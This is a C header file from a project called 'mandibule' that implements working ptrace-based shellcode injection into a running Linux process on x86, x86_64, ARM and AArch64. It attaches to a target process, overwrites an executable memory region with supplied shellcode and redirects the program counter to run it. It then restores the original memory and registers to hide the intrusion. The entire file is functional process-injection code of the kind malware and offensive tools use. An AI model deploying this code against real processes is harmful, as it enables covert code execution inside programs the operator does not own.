// ======================================================================== //
// author:  ixty                                                       2018 //
// project: mandibule                                                       //
// licence: beerware                                                        //
// ======================================================================== //

// code to inject code in a remote process using ptrace
// entry point is:
    // int pt_inject(pid_t pid, uint8_t * sc_buf, size_t sc_len, size_t start_offset);

#ifndef _PTRACE_H
#define _PTRACE_H

#include <asm/ptrace.h>
#include <sys/user.h>
#include <sys/uio.h>

// ======================================================================== //
// arch specific defines
// ======================================================================== //
#if defined(__i386__)
    #define REG_TYPE    user_regs_struct
    #define REG_PC      eip
    #define PC_OFF      2
    #define REG_SYSCALL orig_eax

#elif defined(__x86_64__)
    #define REG_TYPE    user_regs_struct
    #define REG_PC      rip
    #define PC_OFF      2
    #define REG_SYSCALL orig_rax

#elif defined(__arm__)
    #define REG_TYPE    user_regs
    #define REG_PC      uregs[15]
    #define PC_OFF      4
    #define REG_SYSCALL uregs[7]

#elif defined(__aarch64__)
    #define REG_TYPE    user_regs_struct
    #define REG_PC      pc
    #define PC_OFF      4
    #define REG_SYSCALL regs[8]

#else
    #error "unknown arch"
#endif


// ======================================================================== //
// tools
// ======================================================================== //

// error macro
#define _pt_fail(...) do { printf(__VA_ARGS__); return -1; } while(0)

// returns the first executable segment of a process
int _pt_getxzone(pid_t pid, unsigned long * addr, size_t * size)
{
    size_t min_size = *size;

    if(get_section(pid, "r-xp", addr, size) == 0 && *size > min_size)
        return 0;
    if(get_section(pid, "rwxp", addr, size) == 0 && *size > min_size)
        return 0;
    _pt_fail("> no executable section is large enough :/\n");
}

// read remote memory lword by lword
int _pt_read(int pid, void * addr, void * dst, size_t len)
{
    size_t n = 0;
    long r;

    while(n < len)
    {
        if( (r = _ptrace(PTRACE_PEEKTEXT, pid, (uint8_t*)addr + n, (uint8_t*)dst + n)) < 0)
            _pt_fail("_pt_read error %d\n", r);
        n += sizeof(long);
    }
    return 0;
}

// write remote memory lword by lword
int _pt_write(int pid, void * addr, void * src, size_t len)
{
    size_t n = 0;
    long r;

    while(n < len)
    {
        if( (r = _ptrace(PTRACE_POKETEXT, pid, (uint8_t*)addr + n, (void*)*(long*)((uint8_t*)src + n))) < 0)
            _pt_fail("_pt_write error %d", r);
        n += sizeof(long);
    }
    return 0;
}

// arm64 doesnt support PTRACE_GETREGS, so we use getregset
int _pt_getregs(int pid, struct REG_TYPE * regs)
{
    struct iovec io;
    io.iov_base = regs;
    io.iov_len = sizeof(*regs);

    if(_ptrace(PTRACE_GETREGSET, pid, (void*)NT_PRSTATUS, (void*)&io) == -1)
        _pt_fail("> PTRACE_GETREGSET error\n");
    return 0;
}

// arm64 doesnt support PTRACE_GETREGS, so we use getregset
int _pt_setregs(int pid, struct REG_TYPE * regs)
{
    struct iovec io;
    io.iov_base = regs;
    io.iov_len = sizeof(*regs);

    if(_ptrace(PTRACE_SETREGSET, pid, (void*)NT_PRSTATUS, (void*)&io) == -1)
        _pt_fail("> PTRACE_SETREGSET error\n");
    return 0;
}

int _pt_cancel_syscall(int pid)
{
#ifdef __arm__
    if(_ptrace(PTRACE_SET_SYSCALL, pid, NULL, (void*)-1) < 0)
        _pt_fail("> PTRACE_SET_SYSCALL err\n");

#elif __aarch64__
    struct iovec iov;
    long sysnbr = -1;

    iov.iov_base = &sysnbr;
    iov.iov_len = sizeof(long);
    if(_ptrace(PTRACE_SETREGSET, pid, (void*)NT_ARM_SYSTEM_CALL, &iov) < 0)
        _pt_fail("> PTRACE_SETREGSET NT_ARM_SYSTEM_CALL err\n");
#else
    // nothing specific to do on x86 & amd64
#endif
    return 0;
}

// inject shellcode via ptrace into remote process
int pt_inject(pid_t pid, uint8_t * sc_buf, size_t sc_len, size_t start_offset)
{
    struct REG_TYPE regs;
    struct REG_TYPE regs_backup;
    unsigned long   rvm_a = 0;
    size_t          rvm_l = sc_len;
    uint8_t *       mem_backup = NULL;
    int             s;

    memset(&regs, 0, sizeof(regs));
    memset(&regs_backup, 0, sizeof(regs_backup));

    // get executable section large enough for our injected code
    if(_pt_getxzone(pid, &rvm_a, &rvm_l) < 0)
        return -1;
    printf("> shellcode injection addr: 0x%lx size: 0x%lx (available: 0x%lx)\n", rvm_a, sc_len, rvm_l);

    // attach process & wait for break
    if(_ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
        _pt_fail("> PTRACE_ATTACH error");
    if(_wait4(pid, &s, WUNTRACED, NULL) != pid)
        _pt_fail("> wait4(%d) error\n", pid);
    printf("> success attaching to pid %d\n", pid);

    // backup registers
    if(_pt_getregs(pid, &regs))
        return -1;
    memcpy(&regs_backup, &regs, sizeof(struct REG_TYPE));

    // backup memory
    if(!(mem_backup = malloc(sc_len + sizeof(long))))
        _pt_fail("> malloc failed to allocate memory for remote mem backup\n");

    if(_pt_read(pid, (void*)rvm_a, mem_backup, sc_len) < 0)
        _pt_fail("> failed to read remote memory\n");
    printf("> backed up mem & registers\n");

    // inject shellcode
    if(_pt_write(pid, (void*)rvm_a, sc_buf, sc_len))
        return -1;
    printf("> injected shellcode at 0x%lx\n", rvm_a);

    // adjust PC / eip / rip to our injected code
    regs.REG_PC = rvm_a + PC_OFF + start_offset;
    if(_pt_setregs(pid, &regs))
        return -1;

    // execute code now
    printf("> running shellcode..\n");

    // wait until the target process calls exit() / exit_group()
    while(1)
    {
        if(_ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
            _pt_fail("> PTRACE_SYSCALL error\n");

        if(_wait4(pid, &s, 0, NULL) < 0 || WIFEXITED(s))
            _pt_fail("> wait4 error\n");

        if(_pt_getregs(pid, &regs))
            return -1;

        if(regs.REG_SYSCALL == SYS_exit || regs.REG_SYSCALL == SYS_exit_group)
        {
            _pt_cancel_syscall(pid);
            break;
        }

    }

    printf("> shellcode executed!\n");

    // restore reg & mem backup
    if(_pt_write(pid, (void*)rvm_a, mem_backup, sc_len))
        return -1;
    if(_pt_setregs(pid, &regs_backup))
        return -1;
    printf("> restored memory & registers\n");

    // all done, detach now
    if(_ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0)
        _pt_fail("> _pt_detach error\n");

    return 0;
}

#endif
